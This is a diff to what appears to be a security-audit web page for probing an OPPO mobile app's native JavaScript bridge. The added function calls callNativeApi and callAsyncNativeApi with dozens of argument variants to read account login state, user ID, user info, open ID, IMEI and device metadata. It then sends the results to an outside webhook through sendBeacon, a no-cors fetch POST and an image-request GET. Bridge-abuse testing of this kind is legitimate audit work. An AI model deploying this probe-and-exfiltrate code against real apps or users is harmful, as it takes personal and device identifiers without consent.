@@ -20,6 +20,7 @@
 <button onclick="tryStartLogin('manual_start_login_button')">Try doStartLogin</button>
 <button onclick="tryClipboardMarker('manual_clipboard_button')">Try clipboard marker</button>
 <button onclick="tryIndirectNativeApi('manual_indirect_native_api_button')">Try indirect callNativeApi/callAsyncNativeApi</button>
+<button onclick="tryDispatcherReadonly('manual_dispatcher_readonly_button')">Try dispatcher readonly account APIs</button>
 
 <p id="status">WAITING</p>
 <pre id="out"></pre>
@@ -234,6 +235,104 @@
     ];
     payload.results = candidates.map(c => callBridge(c[0], c[1]));
     renderAndSend(payload);
+  };
+
+
+  function sendDispatcherWebhook(payload) {
+    const json = JSON.stringify(payload);
+
+    try {
+      navigator.sendBeacon(
+        WEBHOOK + "/oppo-dispatcher-readonly-result",
+        new Blob([json], { type: "text/plain" })
+      );
+    } catch (e) {}
+
+    try {
+      fetch(WEBHOOK + "/oppo-dispatcher-readonly-post", {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "content-type": "text/plain" },
+        body: json
+      }).catch(function(){});
+    } catch (e) {}
+
+    try {
+      const encoded = encodeURIComponent(json).slice(0, 7500);
+      new Image().src =
+        WEBHOOK +
+        "/oppo-dispatcher-readonly-get?event=" +
+        encodeURIComponent(payload.eventType) +
+        "&t=" + Date.now() +
+        "&d=" + encoded;
+    } catch (e) {}
+  }
+
+  window.tryDispatcherReadonly = function(reason) {
+    const payload = basePayload("OPPO_DISPATCHER_READONLY_RESULT", reason);
+
+    const actions = [
+      "account_islogin",
+      "account_get_userid",
+      "account_get_userinfo",
+      "get_open_id",
+      "get_imei",
+      "get_channel_id",
+      "get_package_name",
+      "get_device_model",
+      "get_network_type"
+    ];
+
+    const candidates = [];
+
+    for (const actionName of actions) {
+      candidates.push({ type: actionName });
+      candidates.push({ action: actionName });
+      candidates.push({ method: actionName });
+      candidates.push({ name: actionName });
+      candidates.push({ id: actionName });
+      candidates.push({ type: actionName, data: {} });
+      candidates.push({ action: actionName, data: {} });
+      candidates.push({ method: actionName, data: {} });
+      candidates.push({ id: "oppo_audit_" + actionName, type: actionName, data: {} });
+      candidates.push({ id: "oppo_audit_" + actionName, action: actionName, data: {} });
+      candidates.push({ id: "oppo_audit_" + actionName, type: actionName, params: {} });
+      candidates.push({ id: "oppo_audit_" + actionName, action: actionName, params: {} });
+    }
+
+    payload.scope = {
+      description: "Read-only dispatcher probe for account/device metadata actions only.",
+      stateChangingActionsSkipped: [
+        "account_start_login",
+        "reLoginAccount",
+        "download_open",
+        "download_start",
+        "download_pause",
+        "download_cancel",
+        "startPay",
+        "openActivity",
+        "openWebView"
+      ],
+      bridgeMethodsTested: ["callNativeApi", "callAsyncNativeApi"]
+    };
+
+    payload.candidateCount = candidates.length;
+    payload.results = [];
+
+    for (const candidate of candidates) {
+      const arg = JSON.stringify(candidate);
+      payload.results.push(callBridge("callNativeApi", [arg]));
+      payload.results.push(callBridge("callAsyncNativeApi", [arg]));
+    }
+
+    document.getElementById("status").textContent =
+      payload.eventType + ": " + payload.ts;
+
+    document.getElementById("out").textContent =
+      JSON.stringify(payload, null, 2);
+
+    sendWebhook(payload);
+    sendDispatcherWebhook(payload);
   };
 
   setTimeout(function () {
